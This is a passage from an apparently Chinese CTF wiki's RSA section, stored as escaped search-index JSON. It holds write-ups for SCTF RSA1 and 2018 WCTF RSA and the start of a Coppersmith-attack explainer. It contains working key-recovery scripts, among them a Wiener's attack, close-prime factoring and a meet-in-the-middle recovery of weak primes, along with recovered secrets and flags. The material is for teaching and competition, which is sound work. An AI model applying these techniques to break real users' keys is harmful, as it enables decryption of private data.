\u8fd9\u65f6\u5019\u5c31\u8981\u8003\u8651\u5176\u4ed6\u60c5\u51b5\u4e86\uff0c\u4e00\u822c\u6765\u8bf4\u73b0\u5b9e\u4e2d\u5b9e\u73b0\u7684 RSA \u90fd\u4e0d\u4f1a\u76f4\u63a5\u7528\u539f\u751f\u7684 RSA\uff0c\u90fd\u4f1a\u52a0\u4e00\u4e9b\u586b\u5145\u6bd4\u5982 OAEP\uff0c\u6211\u4eec\u8fd9\u91cc\u8bd5\u8bd5\uff0c\u4fee\u6539\u4ee3\u7801 def decrypt1 () : with open ( './level1.passwd.enc' ) as f: cipher = f.read () cipher = b64decode ( cipher ) with open ( './private.pem' ) as f: key = RSA.importKey ( f ) key = PKCS1_OAEP.new ( key ) print key.decrypt ( cipher ) \u679c\u7136\u5982\u6b64\uff0c\u5f97\u5230 \u279c level0 git: ( master ) \u2717 python exp.py FaC5ori1ati0n_aTTA3k_p_tOO_sma11 \u5f97\u5230\u89e3\u538b\u5bc6\u7801\u3002\u7ee7\u7eed\uff0c\u67e5\u770b level1 \u4e2d\u7684\u516c\u94a5 \u279c level1 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 2048 bit ) Modulus: 00 :c3:26:59:69:e1:ed:74:d2:e0:b4:9a:d5:6a:7c: 2f:2a:9e:c3:71:ff:13:4b:10:37:c0:6f:56:19:34: c5:cb:1f:6d:c0:e3:57:3b:47:c4:76:3e:21:a3:b0: 11 :11:78:d4:ee:4f:e8:99:2b:15:cb:cb:d7:73:e4: f9:a6:28:20:fd:db:8c:ea:16:ed:67:c2:48:12:6e: 4b:01:53:4a:67:cb:22:23:3b:34:2e:af:13:ef:93: 45 :16:2b:00:9f:e0:4b:d1:90:c9:2c:27:9a:34:c3: 3f:d7:ee:40:f5:82:50:39:aa:8c:e9:c2:7b:f4:36: e3:38:9d:04:50:db:a9:b7:3f:4b:2a:d6:8a:2a:5c: 87 :2a:eb:74:35:98:6a:9c:e4:52:cb:93:78:d2:da: 39 :83:f3:0c:d1:65:1e:66:9c:40:56:06:0d:58:fc: 41 :64:5e:06:da:83:d0:3b:06:42:70:da:38:53:e0: 54 :35:53:ce:de:79:4a:bf:f5:3b:e5:53:7f:6c:18: 12 :67:a9:de:37:7d:44:65:5e:68:0a:78:39:3d:bb: 00 :22:35:0e:a3:94:e6:94:15:1a:3d:39:c7:50:0e: b1:64:a5:29:a3:69:41:40:69:94:b0:0d:1a:ea:9a: 12 :27:50:ee:1e:3a:19:b7:29:70:b4:6d:1e:9d:61: 3e:7d Exponent: 65537 ( 0x10001 ) Modulus = C3265969E1ED74D2E0B49AD56A7C2F2A9EC371FF134B1037C06F561934C5CB1F6DC0E3573B47C4763E21A3B0111178D4EE4FE8992B15CBCBD773E4F9A62820FDDB8CEA16ED67C248126E4B01534A67CB22233B342EAF13EF9345162B009FE04BD190C92C279A34C33FD7EE40F5825039AA8CE9C27BF436E3389D0450DBA9B73F4B2AD68A2A5C872AEB7435986A9CE452CB9378D2DA3983F30CD1651E669C4056060D58FC41645E06DA83D03B064270DA3853E0543553CEDE794ABFF53BE5537F6C181267A9DE377D44655E680A78393DBB0022350EA394E694151A3D39C7500EB164A529A36941406994B00D1AEA9A122750EE1E3A19B72970B46D1E9D613E7D writing RSA key -----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwyZZaeHtdNLgtJrVanwv Kp7Dcf8TSxA3wG9WGTTFyx9twONXO0fEdj4ho7AREXjU7k/omSsVy8vXc+T5pigg /duM6hbtZ8JIEm5LAVNKZ8siIzs0Lq8T75NFFisAn+BL0ZDJLCeaNMM/1+5A9YJQ OaqM6cJ79DbjOJ0EUNuptz9LKtaKKlyHKut0NZhqnORSy5N40to5g/MM0WUeZpxA VgYNWPxBZF4G2oPQOwZCcNo4U+BUNVPO3nlKv/U75VN/bBgSZ6neN31EZV5oCng5 PbsAIjUOo5TmlBUaPTnHUA6xZKUpo2lBQGmUsA0a6poSJ1DuHjoZtylwtG0enWE+ fQIDAQAB -----END PUBLIC KEY----- \u4f3c\u4e4e\u8fd8\u662f\u4e0d\u662f\u5f88\u5927\uff0c\u518d\u6b21\u5206\u89e3\uff0c\u7136\u540e\u8bd5\u4e86 factordb \u4e0d\u884c\uff0c\u8bd5\u8bd5 yafu\u3002\u7ed3\u679c\u5206\u89e3\u51fa\u6765\u4e86\u3002 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496383 P309 = 156956618844706820397012891168512561016172926274406409351605204875848894134762425857160007206769208250966468865321072899370821460169563046304363342283383730448855887559714662438206600780443071125634394511976108979417302078289773847706397371335621757603520669919857006339473738564640521800108990424511408496259 \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u6570\u975e\u5e38\u76f8\u8fd1\uff0c\u53ef\u80fd\u662f factordb \u6ca1\u6709\u5b9e\u73b0\u8fd9\u7c7b\u5206\u89e3\u3002 \u7ee7\u800c\u4e0b\u9762\u7684\u64cd\u4f5c\u7c7b\u4f3c\u4e8e level0\u3002\u53ea\u662f\u8fd9\u6b21\u662f\u76f4\u63a5\u89e3\u5bc6\u5c31\u597d\uff0c\u6ca1\u5565\u586b\u5145\uff0c\u8bd5\u4e86\u586b\u5145\u53cd\u800c\u9519 \u5f97\u5230\u5bc6\u7801 fA35ORI11TLoN_Att1Ck_cL0sE_PrI8e_4acTorS \u3002\u7ee7\u7eed\u4e0b\u4e00\u6b65\uff0c\u67e5\u770b\u516c\u94a5 \u279c level2 git: ( master ) \u2717 openssl rsa -pubin -in public.key -text -modulus Public-Key: ( 1025 bit ) Modulus: 01 :ba:0c:c2:45:b4:5c:e5:b5:f5:6c:d5:ca:a5:90: c2:8d:12:3d:8a:6d:7f:b6:47:37:fb:7c:1f:5a:85: 8c:1e:35:13:8b:57:b2:21:4f:f4:b2:42:24:5f:33: f7:2c:2c:0d:21:c2:4a:d4:c5:f5:09:94:c2:39:9d: 73 :e5:04:a2:66:1d:9c:4b:99:d5:38:44:ab:13:d9: cd:12:a4:d0:16:79:f0:ac:75:f9:a4:ea:a8:7c:32: 16 :9a:17:d7:7d:80:fd:60:29:64:c7:ea:50:30:63: 76 :59:c7:36:5e:98:d2:ea:5b:b3:3a:47:17:08:2d: d5:24:7d:4f:a7:a1:f0:d5:73 Exponent: 01 :00:8e:81:dd:a0:e3:19:28:e8:ee:51:11:08:c7: 50 :5f:61:31:05:d2:e2:ff:9b:83:71:e4:29:c2:dd: 92 :70:65:d4:09:6d:58:c3:76:31:07:f1:d4:fc:cf: 2d:b3:0a:6d:02:7c:56:61:7c:be:7e:0b:7e:d9:22: 28 :66:9e:fb:3d:2f:2c:20:59:3c:21:ef:ff:31:00: 6a:fb:a7:68:de:4a:0a:4c:1a:a7:09:d5:48:98:c8: 1f:cf:fb:dd:f7:9c:ae:ae:0b:15:f4:b2:c7:e0:bc: ba:31:4f:5e:07:83:ad:0e:7f:b9:82:a4:d2:01:fa: 68 :29:6d:66:7c:cf:57:b9:4b Modulus = 1BA0CC245B45CE5B5F56CD5CAA590C28D123D8A6D7FB64737FB7C1F5A858C1E35138B57B2214FF4B242245F33F72C2C0D21C24AD4C5F50994C2399D73E504A2661D9C4B99D53844AB13D9CD12A4D01679F0AC75F9A4EAA87C32169A17D77D80FD602964C7EA5030637659C7365E98D2EA5BB33A4717082DD5247D4FA7A1F0D573 writing RSA key -----BEGIN PUBLIC KEY----- MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQG6DMJFtFzltfVs1cqlkMKN Ej2KbX+2Rzf7fB9ahYweNROLV7IhT/SyQiRfM/csLA0hwkrUxfUJlMI5nXPlBKJm HZxLmdU4RKsT2c0SpNAWefCsdfmk6qh8MhaaF9d9gP1gKWTH6lAwY3ZZxzZemNLq W7M6RxcILdUkfU+nofDVcwKBgQEAjoHdoOMZKOjuUREIx1BfYTEF0uL/m4Nx5CnC 3ZJwZdQJbVjDdjEH8dT8zy2zCm0CfFZhfL5+C37ZIihmnvs9LywgWTwh7/8xAGr7 p2jeSgpMGqcJ1UiYyB/P+933nK6uCxX0ssfgvLoxT14Hg60Of7mCpNIB+mgpbWZ8 z1e5Sw == -----END PUBLIC KEY----- \u53d1\u73b0\u79c1\u94a5 e \u548c n \u51e0\u4e4e\u4e00\u6837\u5927\uff0c\u8003\u8651 d \u6bd4\u8f83\u5c0f\uff0c\u4f7f\u7528 Wiener's Attack\u3002\u5f97\u5230 d\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u518d\u6b21\u9a8c\u8bc1\u4e00\u904d\u3002 \u279c level2 git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- Hacked! ( 'hacked_d = ' , 29897859398360008828023114464512538800655735360280670512160838259524245332403L ) ------------------------- \u8fd9\u65f6\u6211\u4eec\u89e3\u5bc6\u5bc6\u6587\uff0c\u89e3\u5bc6\u4ee3\u7801\u5982\u4e0b from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 , PKCS1_OAEP import gmpy2 from base64 import b64decode d = 29897859398360008828023114464512538800655735360280670512160838259524245332403L with open ( './public.key' ) as f : key = RSA . importKey ( f ) n = key . n e = key . e def getprivatekey ( n , e , d ): priviatekey = RSA . construct (( long ( n ), long ( e ), long ( d ))) with open ( 'private.pem' , 'w' ) as f : f . write ( priviatekey . exportKey ()) def decrypt (): with open ( './level3.passwd.enc' ) as f : cipher = f . read () with open ( './private.pem' ) as f : key = RSA . importKey ( f ) print key . decrypt ( cipher ) getprivatekey ( n , e , d ) decrypt () \u5229\u7528\u672b\u5c3e\u7684\u5b57\u7b26\u4e32 wIe6ER1s_1TtA3k_e_t00_larg3 \u89e3\u5bc6\u538b\u7f29\u5305\uff0c\u6ce8\u610f\u53bb\u6389 B\u3002\u81f3\u6b64\u5168\u90e8\u89e3\u5bc6\u7ed3\u675f\uff0c\u5f97\u5230 flag\u3002","title":"SCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_complex/#2018-wctf-rsa","text":"\u9898\u76ee\u57fa\u672c\u63cf\u8ff0\u4e3a Description: Encrypted message for user \"admin\": <<<320881698662242726122152659576060496538921409976895582875089953705144841691963343665651276480485795667557825130432466455684921314043200553005547236066163215094843668681362420498455007509549517213285453773102481574390864574950259479765662844102553652977000035769295606566722752949297781646289262341623549414376262470908749643200171565760656987980763971637167709961003784180963669498213369651680678149962512216448400681654410536708661206594836597126012192813519797526082082969616915806299114666037943718435644796668877715954887614703727461595073689441920573791980162741306838415524808171520369350830683150672985523901>>> admin public key: n = 483901264006946269405283937218262944021205510033824140430120406965422208942781742610300462772237450489835092525764447026827915305166372385721345243437217652055280011968958645513779764522873874876168998429546523181404652757474147967518856439439314619402447703345139460317764743055227009595477949315591334102623664616616842043021518775210997349987012692811620258928276654394316710846752732008480088149395145019159397592415637014390713798032125010969597335893399022114906679996982147566245244212524824346645297637425927685406944205604775116409108280942928854694743108774892001745535921521172975113294131711065606768927 e = 65537 Service: http://36.110.234.253 \u8fd9\u4e2a\u9898\u76ee\u73b0\u5728\u5df2\u7ecf\u6ca1\u6709\u529e\u6cd5\u5728\u7ebf\u83b7\u53d6 binary \u4e86\uff0c\u73b0\u5728\u5f97\u5230\u7684 binary \u662f\u4e4b\u524d\u5df2\u7ecf\u4e0b\u8f7d\u597d\u7684\uff0c\u6211\u4eec\u5f53\u65f6\u9700\u8981\u767b\u5f55\u7528\u6237\u7684 admin \u6765\u4e0b\u8f7d\u5bf9\u5e94\u7684 generator\u3002 \u901a\u8fc7\u7b80\u5355\u9006\u5411\u8fd9\u4e2a generator\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u7a0b\u5e8f\u662f\u8fd9\u4e48\u5de5\u4f5c\u7684 \u5229\u7528\u7528\u6237\u7ed9\u5b9a\u7684 license\uff0832 \u4e2a\u5b57\u8282\uff09\uff0c\u8fed\u4ee3\u89e3\u5bc6\u67d0\u4e2a \u56fa\u5b9a\u4f4d\u7f6e \u4e4b\u540e\u7684\u6570\u636e\uff0c\u6bcf 32 \u4e2a\u5b57\u8282\u4e00\u7ec4\uff0c\u4e0e\u5bc6\u94a5\u76f8\u5f02\u6216\u5f97\u5230\u7ed3\u679c\u3002 \u5bc6\u94a5\u7684\u751f\u6210\u65b9\u6cd5\u4e3a k_1=key k_1=key k_2 =sha256(k_1) k_2 =sha256(k_1) ... k_n=sha256(k_{n-1}) k_n=sha256(k_{n-1}) \u5176\u4e2d\uff0c\u56fa\u5b9a\u4f4d\u7f6e\u5c31\u662f\u5728\u627e\u6e90\u6587\u4ef6 generator \u4e2d\u7b2c\u4e8c\u6b21\u51fa\u73b0 ENCRYPTED \u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u518d\u6b21\u504f\u79fb 32 \u4e2a\u5b57\u8282\u3002 _ENCRYPT_STR = ENCRYPTED_STR ; v10 = 0 ; ENCRYPTED_LEN = strlen ( ENCRYPTED_STR ); do { do ++ v9 ; while ( strncmp ( & file_contents [ v9 ], _ENCRYPT_STR , ENCRYPTED_LEN ) ); ++ v10 ; } while ( v10 <= 1 ); v11 = & file_start_off_32 [ loc2 + ENCRYPTED_LEN ]; v12 = loc2 + ENCRYPTED_LEN ; len = file_size - ( loc2 + ENCRYPTED_LEN ) - 32 ; decrypt ( & file_start_off_32 [ v12 ], & license , len ); sha256_file_start ( v11 , len , & output ); if ( ! memcmp ( & output , & file_contents [ v12 ], 0x20 u ) ) { v14 = fopen ( \"out.exe\" , \"wb\" ); fwrite ( v11 , 1 u , len , v14 ); fclose ( v14 ); sprintf ( byte_406020 , \"out.exe %s \" , argv [ 1 ]); system ( byte_406020 ); } \u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd\u751f\u6210\u7684\u6587\u4ef6\u7684\u6821\u9a8c\u5bf9\u5e94\u7684\u54c8\u5e0c\u503c\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u503c\uff0c\u7531\u4e8e\u6587\u4ef6\u6700\u540e\u662f\u4e00\u4e2a exe \u6587\u4ef6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u8ba4\u4e3a\u6700\u540e\u7684\u6587\u4ef6\u5934\u5c31\u662f\u6807\u51c6\u7684 exe \u6587\u4ef6\uff0c\u56e0\u6b64\u5c31\u4e0d\u9700\u8981\u77e5\u9053\u539f\u59cb\u7684 license \u6587\u4ef6\uff0c\u8fdb\u800c\u6211\u4eec\u53ef\u4ee5\u7f16\u5199 python \u811a\u672c\u751f\u6210 exe\u3002 \u5728\u751f\u6210\u7684 exe \u4e2d\uff0c\u6211\u4eec\u5206\u6790\u51fa\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u4e3a \u8bfb\u53d6 license \u4f7f\u7528 license \u4f5c\u4e3a seed \u5206\u522b\u751f\u6210 pq \u5229\u7528 p\uff0cq \u751f\u6210 n\uff0ce\uff0cd\u3002 \u5176\u6f0f\u6d1e\u51fa\u73b0\u5728\u751f\u6210 p\uff0cq \u7684\u65b9\u6cd5\u4e0a\uff0c\u800c\u4e14\u751f\u6210 p \u548c q \u7684\u65b9\u6cd5\u7c7b\u4f3c\u3002 \u6211\u4eec\u5982\u679c\u4ed4\u7ec6\u5206\u6790\u4e0b\u751f\u6210\u7d20\u6570\u7684\u51fd\u6570\u7684\u8bdd\uff0c\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u7d20\u6570\u90fd\u662f\u5206\u4e3a\u4e24\u90e8\u5206\u751f\u6210\u7684 \u751f\u6210\u5de6\u534a\u90e8\u5206 512 \u4f4d\u3002 \u751f\u6210\u53f3\u534a\u90e8\u5206 512 \u4f4d\u3002 \u5de6\u53f3\u6784\u6210 1024 \u6bd4\u7279\u4f4d\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7d20\u6570\uff0c\u662f\u7d20\u6570\u5c31\u6210\u529f\uff0c\u4e0d\u662f\u7d20\u6570\uff0c\u7ee7\u7eed\u751f\u6210\u3002 \u5176\u4e2d\u751f\u6210\u6bcf\u90e8\u5206\u7684\u65b9\u5f0f\u76f8\u540c\uff0c\u65b9\u5f0f\u4e3a sha512 ( const1 | const2 | const3 | const4 | const5 | const6 | const7 | const8 | v9 ) v9 = r % 1000000007 \u53ea\u6709 v9 \u4f1a\u6709\u6240\u53d8\u5316\uff0c\u4f46\u662f\u5b83\u7684\u8303\u56f4\u5374\u662f\u56fa\u5b9a\u7684\u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u8868\u793a p\uff0cq \u4e3a p=a*2^{512}+b p=a*2^{512}+b q=c*2^{512}+d q=c*2^{512}+d \u90a3\u4e48 n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd n=pq=ac*2^{1024}+(ad+bc)*2^{512}+bd \u90a3\u4e48 n \\equiv bd \\bmod 2^{512} n \\equiv bd \\bmod 2^{512} \u800c\u4e14\u7531\u4e8e p \u548c q \u5728\u751f\u6210\u65f6\uff0ca\uff0cb\uff0cc\uff0cd \u5747\u53ea\u6709 1000000007 \u79cd\u53ef\u80fd\u6027\u3002 \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u6027\uff0c\u9996\u5148\u8ba1\u7b97\u51fa b \u53ef\u80fd\u7684\u96c6\u5408\u4e3a S\uff0c\u540c\u65f6\u6211\u4eec\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u653b\u51fb\uff0c\u8ba1\u7b97 n/d \\equiv b \\bmod 2^{512} n/d \\equiv b \\bmod 2^{512} \u8fd9\u91cc\u7531\u4e8e b \u548c d \u90fd\u662f p \u7684\u5c3e\u6570\uff0c\u6240\u4ee5\u4e00\u5b9a\u4e0d\u4f1a\u662f 2 \u7684\u500d\u6570\uff0c\u8fdb\u800c\u5fc5\u7136\u5b58\u5728\u9006\u5143\u3002 \u8fd9\u6837\u505a\u867d\u7136\u53ef\u4ee5\uff0c\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7b97\u4e00\u4e0b\u5b58\u50a8\u7a7a\u95f4 64*1000000007 / 1024 / 1024 / 1024=59 64*1000000007 / 1024 / 1024 / 1024=59 \u4e5f\u5c31\u662f\u8bf4\u9700\u8981 59 G\uff0c\u592a\u5927\u4e86\uff0c\uff0c\u6240\u4ee5\u6211\u4eec\u4ecd\u7136\u9700\u8981\u8fdb\u4e00\u6b65\u8003\u8651 n \\equiv bd \\bmod 2^{64} n \\equiv bd \\bmod 2^{64} \u8fd9\u6837\uff0c\u6211\u4eec\u7684\u5185\u5b58\u9700\u6c42\u77ac\u95f4\u5c31\u964d\u5230\u4e86 8 G\u5de6\u53f3\u3002\u6211\u4eec\u4ecd\u7136\u4f7f\u7528\u679a\u4e3e\u7684\u65b9\u6cd5\u8fdb\u884c\u8fd0\u7b97\u3002 \u5176\u6b21\uff0c\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 python\uff0c\uff0cpython \u5360\u636e\u7a7a\u95f4\u592a\u5927\uff0c\u56e0\u6b64\u9700\u8981\u4f7f\u7528 c/c++ \u7f16\u5199\u3002 \u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684 d \u8ba1\u7b97\u5bf9\u5e94\u7684\u503c n/d n/d \u5982\u679c\u5bf9\u5e94\u7684\u503c\u5728\u96c6\u5408 S \u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u627e\u5230\u4e86\u4e00\u5bf9\u5408\u6cd5\u7684 b \u548c d\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u6062\u590d p \u548c q \u7684\u4e00\u534a\u3002 \u4e4b\u540e\uff0c\u6211\u4eec\u6839\u636e n-bd=ac*2^{1024}+(ad+bc)*2^{512} n-bd=ac*2^{1024}+(ad+bc)*2^{512} \u53ef\u4ee5\u5f97\u5230 \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} = ac*2^{512}+ad+bc \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \\frac{n-bd}{2^{512}} \\equiv ad+bc \\bmod 2^{512} \u7c7b\u4f3c\u5730\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba1\u7b97\u51fa a \u548c c\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5b8c\u5168\u6062\u590d\u51fa p \u548c q\u3002 \u5728\u5177\u4f53\u6c42\u89e3\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5728\u6c42 p \u548c q \u7684\u4e00\u90e8\u5206\u65f6\uff0c\u53ef\u4ee5\u53d1\u73b0\u56e0\u4e3a\u662f\u6a21 2^{64} 2^{64} \uff0c\u6240\u4ee5\u53ef\u80fd\u5b58\u5728\u78b0\u649e\uff08\u4f46\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u662f p\uff0c\u53e6\u5916\u4e00\u4e2a\u662fq\uff0c\u6070\u597d\u5bf9\u79f0\u3002\uff09\u3002\u4e0b\u9762\u6211\u4eec\u5c31\u6c42\u5f97\u4e86 b \u5bf9\u5e94\u7684 v9\u3002 \u6ce8\u610f\uff1a\u8fd9\u91cc\u679a\u4e3e\u51fa\u6765\u7684\u7a7a\u95f4\u5927\u7ea6\u5360\u7528 11 \u4e2a G\uff08\u5305\u62ec\u7d22\u5f15\uff09\uff0c\u6240\u4ee5\u8bf7\u9009\u62e9\u5408\u9002\u7684\u4f4d\u7f6e\u3002 b64: 9646799660ae61bd idx_b: 683101175 idx_d: 380087137 search 23000000 search 32000000 search 2b000000 search d000000 search 3a000000 search 1c000000 search 6000000 search 24000000 search 15000000 search 33000000 search 2c000000 search e000000 b64: 9c63259ccab14e0b idx_b: 380087137 idx_d: 683101175 search 1d000000 search 3b000000 search 7000000 search 16000000 search 25000000 search 34000000 \u5176\u5b9e\uff0c\u6211\u4eec\u5728\u771f\u6b63\u5f97\u5230 p \u6216\u8005 q \u7684\u4e00\u90e8\u5206\u540e\uff0c\u53e6\u5916\u4e00\u90e8\u5206\u5b8c\u5168\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u679a\u4e3e\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u56e0\u4e3a\u8ba1\u7b97\u91cf\u51e0\u4e4e\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6700\u540e\u7ed3\u679c\u4e3a ... hash 7000000 hash 30000000 p = 13941980378318401138358022650359689981503197475898780162570451627011086685747898792021456273309867273596062609692135266568225130792940286468658349600244497842007796641075219414527752166184775338649475717002974228067471300475039847366710107240340943353277059789603253261584927112814333110145596444757506023869 q = 34708215825599344705664824520726905882404144201254119866196373178307364907059866991771344831208091628520160602680905288551154065449544826571548266737597974653701384486239432802606526550681745553825993460110874794829496264513592474794632852329487009767217491691507153684439085094523697171206345793871065206283 plain text 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 hash 16000000 hash 25000000 hash b000000 hash 34000000 hash 1 a000000 ... \u279c 2018 - WCTF - rsa git :( master ) \u2717 python Python 2.7 . 14 ( default , Mar 22 2018 , 14 : 43 : 05 ) [ GCC 4.2 . 1 Compatible Apple LLVM 9.0 . 0 ( clang - 900.0 . 39.2 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information . >>> p = 13040004482825754828623640066604760502140535607603761856185408344834209443955563791062741885 >>> hex ( p )[ 2 :] . decode ( 'hex' ) Traceback ( most recent call last ): File \"<stdin>\" , line 1 , in < module > File \"/usr/local/Cellar/python@2/2.7.14_3/Frameworks/Python.framework/Versions/2.7/lib/python2.7/encodings/hex_codec.py\" , line 42 , in hex_decode output = binascii . a2b_hex ( input ) TypeError : Odd - length string >>> hex ( p )[ 2 : - 1 ] . decode ( 'hex' ) 'flag{fa6778724ed740396fc001b198f30313}' \u6700\u540e\u6211\u4eec\u4fbf\u62ff\u5230 flag \u4e86\u3002 \u8be6\u7ec6\u7684\u5229\u7528\u4ee3\u7801\u8bf7\u53c2\u89c1 ctf-challenge \u4ed3\u5e93\u3002 \u76f8\u5173\u7f16\u8bd1\u6307\u4ee4\uff0c\u9700\u8981\u94fe\u63a5\u76f8\u5173\u7684\u5e93\u3002 g++ exp2.cpp -std = c++11 -o main2 -lgmp -lcrypto -pthread","title":"2018 WCTF RSA"},{"location":"crypto/asymmetric/rsa/rsa_complex/#_1","text":"https://upbhack.de/posts/wctf-2018-writeup-rsa/","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/","text":"Coppersmith \u76f8\u5173\u653b\u51fb \u00b6 \u57fa\u672c\u539f\u7406 \u00b6 Coppersmith \u76f8\u5173\u653b\u51fb\u4e0e Don Coppersmith \u7d27\u5bc6\u76f8\u5173\uff0c\u4ed6\u63d0\u51fa\u4e86\u4e00\u79cd\u9488\u5bf9\u4e8e\u6a21\u591a\u9879\u5f0f\uff08\u5355\u53d8\u91cf\uff0c\u4e8c\u5143\u53d8\u91cf\uff0c\u751a\u81f3\u591a\u5143\u53d8\u91cf\uff09\u627e\u6240\u6709\u5c0f\u6574\u6570\u6839\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u65b9\u6cd5\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u5047\u8bbe \u6a21\u6570\u4e3a N \uff0cN \u5177\u6709\u4e00\u4e2a\u56e0\u5b50 b\\geq N^{\\beta},1< \\beta \\leq1 b\\geq N^{\\beta},1< \\beta \\leq1 \u591a\u9879\u5f0f F \u7684\u6b21\u6570\u4e3a \\delta \\delta \u90a3\u4e48\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5728 O(c\\delta^5log^9(N)) O(c\\delta^5log^9(N)) \u7684\u590d\u6742\u5ea6\u5185\u627e\u5230\u8be5\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839 x_0 x_0 \uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u6c42 |x_0|<cN^{\\frac{\\beta^2}{\\delta}} |x_0|<cN^{\\frac{\\beta^2}{\\delta}} \u3002 \u5728\u8fd9\u4e2a\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u627e\u5230\u5728\u6a21 N \u610f\u4e49\u4e0b\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839\uff0c\u8fd9\u4e00\u95ee\u9898\u88ab\u8ba4\u4e3a\u662f\u590d\u6742\u7684\u3002 Coppersmith method \u4e3b\u8981\u662f\u901a\u8fc7 Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm \uff08LLL\uff09\u65b9\u6cd5\u627e\u5230 \u4e0e\u8be5\u591a\u9879\u5f0f\u5177\u6709\u76f8\u540c\u6839 x_0 x_0 \u66f4\u5c0f\u7cfb\u6570 \u5b9a\u4e49\u57df\u4e3a\u6574\u6570\u57df \u7684\u591a\u9879\u5f0f g\uff0c\u7531\u4e8e\u5728\u6574\u6570\u57df\u4e0a\u627e\u591a\u9879\u5f0f\u7684\u6839\u662f\u7b80\u5355\u7684\uff08Berlekamp\u2013Zassenhaus\uff09\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u539f\u591a\u9879\u5f0f\u5728\u6a21\u610f\u4e49\u4e0b\u7684\u6574\u6570\u6839\u3002 \u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06 f \u8f6c\u6362\u5230 g \u5462\uff1fHowgrave-Graham \u7ed9\u51fa\u4e86\u4e00\u79cd\u601d\u8def \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5177\u6709\u201c\u66f4\u5c0f\u7cfb\u6570\u201d\u7684\u591a\u9879\u5f0f g\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u7684\u8f6c\u6362\u65b9\u5f0f \u5728 LLL \u7b97\u6cd5\u4e2d\uff0c\u6709\u4e24\u70b9\u662f\u975e\u5e38\u6709\u7528\u7684 \u53ea\u5bf9\u539f\u6765\u7684\u57fa\u5411\u91cf\u8fdb\u884c\u6574\u6570\u7ebf\u6027\u53d8\u6362\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5728\u5f97\u5230 g \u65f6\uff0c\u4ecd\u7136\u4ee5\u539f\u6765\u7684 x_0 x_0 \u4e3a\u6839\u3002 \u751f\u6210\u7684\u65b0\u7684\u57fa\u5411\u91cf\u7684\u6a21\u957f\u662f\u6709\u754c\u7684\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5229\u7528 Howgrave-Graham \u5b9a\u7406\u3002 \u5728\u8fd9\u6837\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u6211\u4eec\u518d\u6784\u9020\u51fa\u591a\u9879\u5f0f\u65cf g 